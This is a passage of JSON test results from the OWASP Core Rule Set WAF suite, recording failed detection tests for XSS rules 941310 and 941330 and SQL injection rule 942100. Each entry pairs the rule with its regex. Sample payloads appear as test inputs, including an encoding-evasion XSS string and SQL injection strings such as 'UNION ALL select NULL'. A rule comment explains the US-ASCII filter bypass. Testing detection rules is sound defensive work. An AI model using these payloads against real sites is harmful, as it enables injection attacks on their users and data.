          "action_type" : "transform",
          "name" : "htmlEntityDecode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "jsDecode"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "US-ASCII Malformed Encoding XSS Filter - Attack Detected"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-tomcat"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-xss"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "xss-perf-disable"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-XSS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/242"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "chain"
        } ]
      }
    }
  }, {
    "test_rule" : "941310",
    "test_id" : 3,
    "test_path" : "REQUEST-941-APPLICATION-ATTACK-XSS/941310.yaml",
    "description" : "Positive test using alternate utf-8",
    "cause" : "failed expect_id check: 941310 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=1 rule_id=920480 - Request content type charset is not allowed by policy", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)" ]
    },
    "test" : {
      "test_id" : 3,
      "desc" : "Positive test using alternate utf-8",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Host" : "localhost",
            "Content-Type" : "application/x-www-form-urlencoded; charset=us-ascii",
            "User-Agent" : "OWASP CRS test agent",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
          },
          "method" : "POST",
          "port" : 80,
          "uri" : "/post",
          "data" : "var=\\xd0\\xbcscript\\xd0\\xbealert(\\xc2\\xa2XSS\\xc2\\xa2)\\xd0\\xbc/script\\xd0\\xbe",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 941310 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 941310,
      "phase" : 2,
      "chain" : true,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html"
        }, {
          "type" : "Comment",
          "text" : " US-ASCII encoding bypass listed on XSS filter evasion"
        }, {
          "type" : "Comment",
          "text" : " Reported by Mazin Ahmed"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This evasion covered by this chain of rules is specific to webservers that deliver content in US-ASCII."
        }, {
          "type" : "Comment",
          "text" : " Only Apache Tomcat is known (according to the page linked above) to be vulnerable to this and probably has to be"
        }, {
          "type" : "Comment",
          "text" : " misconfigured for this to happen."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Since US-ASCII is a seven bit encoding, bit 8 is ignored. Consider the following ISO 8859-1 sequence:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " scriptalert(XSS)/script"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " A filter looking for tags will usually not match against this sequence because there are no angle brackets (< / >). However,"
        }, {
          "type" : "Comment",
          "text" : " the characters where the brackets would be are ISO 8859-1 characters:"
        }, {
          "type" : "Comment",
          "text" : " - : 0x00BC"
        }, {
          "type" : "Comment",
          "text" : " - : 0x00BE"
        }, {
          "type" : "Comment",
          "text" : " - : 0x00A2"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " And this is how the sequence looks in in US-ASCII:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " <script>alert(\"XSSB\")</script/>"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This enables an attacker to craft a string that will be delivered in a form that a browser will execute as script"
        }, {
          "type" : "Comment",
          "text" : " while being ignored by input filters."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule looks for a start tag sequence that looks like \"<...>\" (checks for hex and plain to be sure)."
        }, {
          "type" : "Comment",
          "text" : " Because the bytes matched occur in many different languages encoded as multibyte characters (e.g. UTF-8)"
        }, {
          "type" : "Comment",
          "text" : " (e.g. German umlauts, Russian characters) this isn't very helpful and can cause many false positives. We, therefore,"
        }, {
          "type" : "Comment",
          "text" : " use a chained rule to also look for an end tag sequence that looks like \"</...>\". Only if the chained rule matches will"
        }, {
          "type" : "Comment",
          "text" : " the request be blocked."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This is of course still not perfect but should at least make it harder to hide most tags using this technique while"
        }, {
          "type" : "Comment",
          "text" : " requiring very specific patterns in a language to match, which should get rid of most false positives."
        }, {
          "type" : "Comment",
          "text" : " These rules would, for example, not guard against an element without an end tag, e.g. \"<img... />\"."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " US-ASCII on Wikipedia: https://en.wikipedia.org/wiki/ASCII"
        }, {
          "type" : "Comment",
          "text" : " ISO 8859-1 on Wikipedia: https://en.wikipedia.org/wiki/ISO/IEC_8859-1"
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "SimpleVariable",
          "name" : "REQUEST_FILENAME"
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "\\xbc[^\\xbe>]*[\\xbe>]|<[^\\xbe]*\\xbe"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 941310
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "lowercase"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "urlDecodeUni"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "htmlEntityDecode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "jsDecode"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "US-ASCII Malformed Encoding XSS Filter - Attack Detected"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-tomcat"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-xss"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "xss-perf-disable"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-XSS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/242"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "chain"
        } ]
      }
    }
  }, {
    "test_rule" : "941330",
    "test_id" : 1,
    "test_path" : "REQUEST-941-APPLICATION-ATTACK-XSS/941330.yaml",
    "description" : "IE XSS Filters - Attack",
    "cause" : "failed expect_id check: 941330 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ ]
    },
    "test" : {
      "test_id" : 1,
      "desc" : "IE XSS Filters - Attack",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?var=%22in%20\\u0076\\u0061l\\u0075e\\u004F\\u0066%3d",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 941330 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 941330,
      "phase" : 2,
      "chain" : false,
      "comment_block" : null,
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : "/_pk_ref/"
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "SimpleVariable",
          "name" : "REQUEST_FILENAME"
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : "/_pk_ref/"
        } ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "(?i:[\\\"'][ ]*(?:[^a-z0-9~_:' ]|in).*?(?:(?:l|\\x5cu006C)(?:o|\\x5cu006F)(?:c|\\x5cu0063)(?:a|\\x5cu0061)(?:t|\\x5cu0074)(?:i|\\x5cu0069)(?:o|\\x5cu006F)(?:n|\\x5cu006E)|(?:n|\\x5cu006E)(?:a|\\x5cu0061)(?:m|\\x5cu006D)(?:e|\\x5cu0065)|(?:o|\\x5cu006F)(?:n|\\x5cu006E)(?:e|\\x5cu0065)(?:r|\\x5cu0072)(?:r|\\x5cu0072)(?:o|\\x5cu006F)(?:r|\\x5cu0072)|(?:v|\\x5cu0076)(?:a|\\x5cu0061)(?:l|\\x5cu006C)(?:u|\\x5cu0075)(?:e|\\x5cu0065)(?:O|\\x5cu004F)(?:f|\\x5cu0066)).*?=)"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 941330
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "htmlEntityDecode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "compressWhitespace"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "IE XSS Filters - Attack Detected"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-xss"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "xss-perf-disable"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/2"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-XSS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/242"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.xss_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl2=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "942100",
    "test_id" : 1,
    "test_path" : "REQUEST-942-APPLICATION-ATTACK-SQLI/942100.yaml",
    "description" : "Simple SQL Injection",
    "cause" : "failed expect_id check: 942100 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=1 rule_id=920420 - Request content type is not allowed by policy", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=942130 - SQL Injection Attack: SQL Boolean-based attack detected", "phase=2 rule_id=942390 - SQL Injection Attack" ]
    },
    "test" : {
      "test_id" : 1,
      "desc" : "Simple SQL Injection",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
          },
          "method" : "POST",
          "port" : 80,
          "uri" : "/post",
          "data" : "var=1234 OR 1=1",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 942100 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 942100,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " -=[ LibInjection Check ]=-"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " There is a stricter sibling of this rule at 942101. It covers REQUEST_BASENAME and REQUEST_FILENAME."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Ref: https://github.com/libinjection/libinjection"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_HEADERS",
          "key" : "User-Agent"
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_HEADERS",
          "key" : "Referer"
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "detect_sqli",
        "value" : ""
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 942100
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "utf8toUnicode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "urlDecodeUni"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "removeNulls"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "SQL Injection Attack Detected via libinjection"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-sqli"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-SQLI"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/66"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "multi_match"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.sql_injection_score=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "942100",
    "test_id" : 5,
    "test_path" : "REQUEST-942-APPLICATION-ATTACK-SQLI/942100.yaml",
    "description" : "Simple SQL injection",
    "cause" : "failed expect_id check: 942100 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=1 rule_id=920420 - Request content type is not allowed by policy", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=942180 - Detects basic SQL authentication bypass attempts 1/3", "phase=2 rule_id=942330 - Detects classic SQL injection probings 1/3", "phase=2 rule_id=942400 - SQL Injection Attack", "phase=2 rule_id=942521 - Detects basic SQL authentication bypass attempts 4.1/4", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)" ]
    },
    "test" : {
      "test_id" : 5,
      "desc" : "Simple SQL injection",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
          },
          "method" : "POST",
          "port" : 80,
          "uri" : "/post",
          "data" : "var=EmptyValue' and 526=527",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 942100 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 942100,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " -=[ LibInjection Check ]=-"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " There is a stricter sibling of this rule at 942101. It covers REQUEST_BASENAME and REQUEST_FILENAME."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Ref: https://github.com/libinjection/libinjection"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_HEADERS",
          "key" : "User-Agent"
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_HEADERS",
          "key" : "Referer"
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "detect_sqli",
        "value" : ""
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 942100
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "utf8toUnicode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "urlDecodeUni"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "removeNulls"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "SQL Injection Attack Detected via libinjection"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-sqli"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-SQLI"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/66"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "multi_match"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.sql_injection_score=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "942100",
    "test_id" : 6,
    "test_path" : "REQUEST-942-APPLICATION-ATTACK-SQLI/942100.yaml",
    "description" : "Simple SQL injection",
    "cause" : "failed expect_id check: 942100 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=1 rule_id=920420 - Request content type is not allowed by policy", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=942190 - Detects MSSQL code execution and information gathering attempts", "phase=2 rule_id=942370 - Detects classic SQL injection probings 2/3", "phase=2 rule_id=942480 - SQL Injection Attack", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)" ]
    },
    "test" : {
      "test_id" : 6,
      "desc" : "Simple SQL injection",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
          },
          "method" : "POST",
          "port" : 80,
          "uri" : "/post",
          "data" : "var=foo') UNION ALL select NULL --",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 942100 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 942100,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " -=[ LibInjection Check ]=-"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " There is a stricter sibling of this rule at 942101. It covers REQUEST_BASENAME and REQUEST_FILENAME."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Ref: https://github.com/libinjection/libinjection"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_HEADERS",
          "key" : "User-Agent"
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_HEADERS",
          "key" : "Referer"
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "detect_sqli",
        "value" : ""
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 942100
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "utf8toUnicode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "urlDecodeUni"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "removeNulls"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "SQL Injection Attack Detected via libinjection"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-sqli"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-SQLI"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/66"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "multi_match"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.sql_injection_score=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "942100",
    "test_id" : 7,
    "test_path" : "REQUEST-942-APPLICATION-ATTACK-SQLI/942100.yaml",
    "description" : "Advanced SQL injection",
    "cause" : "failed expect_id check: 942100 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
